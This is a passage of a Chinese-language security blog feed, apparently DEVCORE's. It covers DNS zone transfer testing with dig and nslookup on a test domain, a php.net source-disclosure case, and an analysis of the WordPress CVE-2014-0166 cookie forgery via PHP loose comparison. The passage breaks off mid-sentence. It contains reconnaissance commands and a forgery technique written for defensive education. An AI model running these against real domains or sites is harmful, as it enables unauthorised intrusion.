&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;dig axfr zonetransfer.me @ns12.zoneedit.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-zKvUVHK73-c/U2do2IyDEpI/AAAAAAAAATk/9fpiMnq8pts/w844-h685-no/linux-zone-transfer-result.jpg&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-zKvUVHK73-c/U2do2IyDEpI/AAAAAAAAATk/9fpiMnq8pts/w844-h685-no/linux-zone-transfer-result.jpg&quot; alt=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 dig 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;從上面的測試結果中我們可發現，zonetransfer.me 這個網域的所有 DNS 設定已全部被列出。&lt;/p&gt;

&lt;h4 id=&quot;windows&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;若是在 Windows 環境，可在命令提示字元環境內使用 &lt;a href=&quot;http://support.microsoft.com/kb/200525/zh-tw&quot;&gt;nslookup&lt;/a&gt; 指令查詢目標 domain 使用哪些 name server：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup -type&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;ns zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Name server 查詢結果：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Server:		8.8.8.8
Address:	8.8.8.8#53

Non-authoritative answer:
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns12.zoneedit.com.
zonetransfer.me	&lt;span class=&quot;nv&quot;&gt;nameserver&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ns16.zoneedit.com.

Authoritative answers can be found from:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;輸入指令後我們如同先前使用 dig 一樣，得知目標有 ns12.zoneedit.com 與 ns16.zoneedit.com 這兩個 name server，接著再如下圖依序輸入三道指令查詢：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nslookup

server ns12.zoneedit.com

ls -d zonetransfer.me&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;註：Linux 版的 nslookup 沒有實作 ls 這個功能喔！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Zone transfer 測試結果：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-AJaByKBuTUU/U2do2FfORdI/AAAAAAAAATc/LMY79aQtyFc/w626-h432-no/windows-zone-transfer-result.jpg&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-AJaByKBuTUU/U2do2FfORdI/AAAAAAAAATc/LMY79aQtyFc/w626-h432-no/windows-zone-transfer-result.jpg&quot; alt=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; title=&quot;使用 nslookup 測試網域是否存在 zone transfer 漏洞&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;測試結果與 Linux 環境所得到的資料雷同，可成功列出該網域的所有 DNS 設定。&lt;/p&gt;

&lt;h4 id=&quot;online-service&quot;&gt;Online Service&lt;/h4&gt;

&lt;p&gt;當然，並不是每個人都熟悉上述指令的操作方式，因此除了介紹手動檢測方法之外，在這裡也提供幾個線上檢測的服務，讓大家可以迅速檢測自家公司或者你正在使用的服務是否有此問題：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ultratools.com/tools/zoneFileDump&quot;&gt;UltraTools&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://hackertarget.com/zone-transfer/&quot;&gt;HackerTarget&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.digitalpoint.com/zone-transfer&quot;&gt;Digital Point&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-1&quot;&gt;實際案例&lt;/h3&gt;

&lt;p&gt;如同上次 &lt;a href=&quot;http://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;HTTP Headers 資安議題&lt;/a&gt;所探討的對象，我們從 TIEA 成員以及 Alexa TW top 525 觀察 zone transfer 問題分別在這些族群中佔有多少比例。&lt;/p&gt;

&lt;p&gt;根據我們監測的結果，在目前 TIEA 的 132 名成員中，有 20 個網域存在 zone transfer 問題，佔了 15.15%。而在 Alexa TW top 525 當中，有 48 個網域存在 zone transfer 問題，佔了 9.14%。乍看之下比率似乎不高，但是在上述兩個族群的網域當中，包括：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;電信商&lt;/li&gt;
  &lt;li&gt;多家電視媒體&lt;/li&gt;
  &lt;li&gt;多家網路新聞媒體&lt;/li&gt;
  &lt;li&gt;多家線上購物網站&lt;/li&gt;
  &lt;li&gt;知名團購網站&lt;/li&gt;
  &lt;li&gt;知名金流公司&lt;/li&gt;
  &lt;li&gt;知名線上音樂服務&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;台灣企業不夠注重資訊安全，罔顧客戶資料安全性，早已不是新聞。然而若企業不顧自身商業利益與責任，當彼此無商業往來時，我們也無法一一咎責。但若連台北市政府、教育部、多間大專院校都有此問題，就令人不太能接受了，這些政府單位與教育機構理當為我們的個人資料安全性負起全部的責任，不應該漏掉任何一個資安環節。上述結果顯示出台灣從政府到企業可能都沒有徹底落實 DNS 的資安設定，而且目前的數據僅僅是針對 TIEA 成員以及 Alexa TW top 525 進行檢測，若是對全台灣或是全世界進行大範圍的檢測，恐怕會發現更多驚人的案例！&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;對企業的潛在影響&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏網域名稱&lt;/p&gt;

    &lt;p&gt;一般企業在進行&lt;a href=&quot;http://devco.re/services/penetration-test&quot;&gt;滲透測試&lt;/a&gt;時，通常只會挑幾個最重要、最常面對客戶的網域進行測試，但是入侵者可不會這麼乖。當有人嘗試要入侵企業時，必定是先進行全面的偵查，觀察企業哪幾個網域所執行的 service 有潛在的弱點，或是看哪幾個網域防禦力道較弱，再從該處下手。因此 zone transfer 問題所提供的完整 DNS 記錄，就為入侵者省下了許多偵查的工夫。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏外網 IP 範圍&lt;/p&gt;

    &lt;p&gt;當攻擊者取得 zone transfer 所洩漏的資料後，可合理推斷哪些網段是屬於該企業，進一步對該網段進行掃描，嘗試找尋有機會入侵之標的物。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;洩漏內網 IP 範圍&lt;/p&gt;

    &lt;p&gt;有些管理人員、開發者為求內部開發方便，經常會將網域名稱跟內網 IP 位址綁在一起，例如將 phpmyadmin.example.com 設定為 192.168.1.100，攻擊者就可根據此類資訊猜測內網哪些網段存在重要服務。這種設定平常也許不會造成重大損害，但是當管理者疏於建立內網防禦機制，恰好企業又被入侵至內網時，造成一連串重大損失的機率將會大幅提高。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-3&quot;&gt;解決方式&lt;/h3&gt;

&lt;h4 id=&quot;linux-1&quot;&gt;Linux&lt;/h4&gt;

&lt;p&gt;若使用 Linux，可在 /etc/named.conf 內加入下列選項，以限制可存取 zone transfer 的來源：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;options &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    allow-transfer &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        1.2.3.4&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        5.6.7.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;設定完畢後，將 DNS 服務重啟即可生效。&lt;/p&gt;

&lt;h4 id=&quot;windows-1&quot;&gt;Windows&lt;/h4&gt;

&lt;p&gt;在 Windows server 當中，我們可到伺服器管理員修改網域的相關設定，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-r7_az_iPK5c/U2do2LxMAQI/AAAAAAAAAT0/novlW-stA3s/w844-h678-no/windows-zone-transfer-solution-1.png&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-r7_az_iPK5c/U2do2LxMAQI/AAAAAAAAAT0/novlW-stA3s/w844-h678-no/windows-zone-transfer-solution-1.png&quot; alt=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; title=&quot;於伺服器管理員修改網域的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在伺服器管理員中，選定想要修改的網域（此處以 test.com 為例），按右鍵點選內容，將會跳出選單如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-6GroJXkIY6I/U2do2i3GqrI/AAAAAAAAATo/QzfAWqsvhUw/w401-h427-no/windows-zone-transfer-solution-2.png&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-6GroJXkIY6I/U2do2i3GqrI/AAAAAAAAATo/QzfAWqsvhUw/w401-h427-no/windows-zone-transfer-solution-2.png&quot; alt=&quot;修改 test.com 的 zone transfer 設定&quot; title=&quot;修改 test.com 的 zone transfer 設定&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;接著就是觀看「允許區域轉送」選項是否有勾選，若已勾選，則確認轉送對象是否為下列兩種：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;只到列在「名稱伺服器索」引標簽上的伺服器&lt;/li&gt;
  &lt;li&gt;只到下列伺服器&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;tcp-53-port&quot;&gt;TCP 53 port&lt;/h4&gt;

&lt;p&gt;DNS 在做 zone transfer 時是使用 TCP 53 port（有別於一般 DNS query 的 UDP 53 port），因此有些人會認為將 TCP 53 port 關閉就可以對付 zone transfer，而不想修改 zone transfer 的設定。其實這個觀念只對了一半，若 zone file 的資料小於 512 byte，仍然可以透過 UDP 傳輸。即使 zone file 的資料大於 512 byte，&lt;a href=&quot;http://securityweekly.com/2011/11/incremental-zone-transfers-for.html&quot;&gt;也可以用 Incremental Zone Transfer (IXFR) 的方式取得部分資料&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&quot;section-4&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;如果企業今天非常有自信能夠替所有網域都準備好完善的安全措施，那麼 zone transfer 所洩漏的資料對該企業就不會有太嚴重的影響。然而，在現今這個入侵手法日新月異的世界裡，又有誰能夠永遠保證自己的安全防護已經做足了呢？在前陣子火紅的 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL CVE-2014-0160 Heartbleed&lt;/a&gt; 問題被爆出來之後，我們就藉由許多 zone transfer 的記錄觀察到全世界有非常多企業只修復了主要網站的 OpenSSL 漏洞，卻忽略了企業內其他的服務與設備可能也有此漏洞，像是 DB、Email、VPN、NAS 等等，直到今日仍遲遲未修復。&lt;/p&gt;

&lt;p&gt;千萬別以為你所購買的各種資安設備能防禦所有資安弱點，也別忽略了各項古老的資安弱點，更別小看了你所不熟悉的駭客們的組合各式各樣弱點的能力，只要有一個資安環節疏漏，隨時都有可能對企業造成致命危機。&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP 官網原始碼讀取案例</title>
   <link href="http://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/"/>
   <updated>2014-04-24T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</id>
   <content type="html">
&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References&quot;&gt;不安全的引用物件 (Insecure Direct Object Reference)&lt;/a&gt; 是個非常常見的資安漏洞，在 &lt;a href=&quot;https://www.owasp.org/&quot;&gt;OWASP&lt;/a&gt; 公布的&lt;a href=&quot;https://www.owasp.org/index.php/Top_10_2013-Top_10&quot;&gt;十大網站應用程式安全漏洞&lt;/a&gt; 中高居第四名。通常發生在網站應用程式上沒有針對輸入的參數做好檢查，就把參數丟入 include 或 readfile 等函數當中引用，使得攻擊者可以藉此存取任意文件的原始碼。&lt;/p&gt;

&lt;p&gt;今天這個案例就發生在 PHP 的官方網站 (&lt;a href=&quot;http://www.php.net/&quot;&gt;http://www.php.net/&lt;/a&gt;)，消息來源是知名的 0-Day 黑市 1337day，發佈的日期是 2014/4/4 ，原始的內容是這樣的：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-ECwrgluiQyQ/U0PMyB-vJEI/AAAAAAAAAPo/D5K9nPbpiKg/s2560/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-ECwrgluiQyQ/U0PMyB-vJEI/AAAAAAAAAPo/D5K9nPbpiKg/w822-h645-no/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day 漏洞交易網站&quot; title=&quot;1337day 漏洞交易網站&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到這個弱點是不公開的，想要知道內容的話要支付 82 美元相當於新台幣 3500 元呢！在強烈的好奇心屈使之下，自己打開工具來找看看：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-3RsKEJngblM/U0PMyFTMzGI/AAAAAAAAAPw/v9zN3MBAs7U/s2560/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-3RsKEJngblM/U0PMyFTMzGI/AAAAAAAAAPw/v9zN3MBAs7U/w926-h678-no/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP 官方網站原始碼&quot; title=&quot;PHP 官方網站原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;透過簡單的分析和一點點運氣，找到了 「&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;」 這隻程式，發現它傳入了「t」和「f」這兩個參數。「t」直覺上就是個 rand 數值，而「f」應該就是檔案位置了。這時候對 f 參數小小修改一下，神奇的事情發生了：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-9x_SEH82fsw/U0PMyelwW3I/AAAAAAAAAPs/yJWXMg_UQiU/s2560/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-9x_SEH82fsw/U0PMyelwW3I/AAAAAAAAAPs/yJWXMg_UQiU/w928-h678-no/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php 讀取原始碼&quot; title=&quot;cached.php 讀取原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php 的原始碼被完整的讀出來，當然也要來看一下 cached.php 是怎麼寫的：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-eOvfw-K2CHg/U0PMy_oHw6I/AAAAAAAAAQA/EXK1c8AFd-k/s2560/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-eOvfw-K2CHg/U0PMy_oHw6I/AAAAAAAAAQA/EXK1c8AFd-k/w861-h678-no/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php 檢視原始碼&quot; title=&quot;cached.php 檢視原始碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;可以看到此處並未對 $_GET[“f”] 進行檢查，所以修改了 $_GET[“f”] 後，與 $abs 組合完，最後就直接丟入 readfile 讀取檔案。比較值得研究的是這邊使用了 realpath 與 strncmp 來比較 f 及 DOCUMENT_ROOT，確保 $abs 只能在網站目錄之下，所以無法使用 ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) 的方式跳脫目錄進行更進一步的滲透。&lt;/p&gt;

&lt;p&gt;最後我們將此發現回報給 security@php.net ，得到的回應是他們是「故意的 (intentional)」。且後來也知道 PHP 官網是開放原始碼（Open Source）的，可以到 &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; 下載整個官網的原始碼。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-6dFKFRG7_Y4/U0PMzE-jk2I/AAAAAAAAAP8/lbpvS0Z2TpA/s2560/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-6dFKFRG7_Y4/U0PMzE-jk2I/AAAAAAAAAP8/lbpvS0Z2TpA/w731-h332-no/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET 官網團隊回應&quot; title=&quot;PHP.NET 官網團隊回應&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;雖然在這個案例中並沒有造成實質上的危害，沒有帳號、密碼、系統設定等機敏資料，但若把此種寫法用在其他地方，則可能造成很大的資安風險。就連 PHP 官方網站都有這樣的失誤，身為開發人員的你們更不可不慎！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>CVE-2014-0166 WordPress 偽造 Cookie 弱點</title>
   <link href="http://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/"/>
   <updated>2014-04-16T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</id>
   <content type="html">
&lt;h3 id=&quot;section&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。
讓我們來分析一下這次的弱點是發生了什麼事吧！&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section-1&quot;&gt;解析&lt;/h3&gt;

&lt;p&gt;這次出問題的程式碼在&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;這邊&lt;/a&gt;，關鍵程式碼如下：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;md5&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;|&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;sd&quot;&gt;/**&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * Fires if a bad authentication cookie hash is encountered.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @since 2.7.0&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   *&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   * @param array $cookie_elements An array of data for the authentication cookie.&lt;/span&gt;
&lt;span class=&quot;sd&quot;&gt;   */&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;官方手冊&lt;/a&gt;。&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;1&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;01&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;10&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e1&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;1e2&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。&lt;br /&gt;
username 是使用者名稱，&lt;br /&gt;
expiration 是有效期限(timestamp)，&lt;br /&gt;
hmac 值用來驗證 cookie 是否合法。&lt;br /&gt;
從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。&lt;/p&gt;

&lt;p&gt;利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0e10123456789012345678901234567890&amp;quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;auth_cookie_bad_hash&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;如此便可以通過驗證，成功偽造合法 cookie。&lt;br /&gt;
而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。&lt;br /&gt;
符合 $hash == 0 的 MD5 $hash 值有 
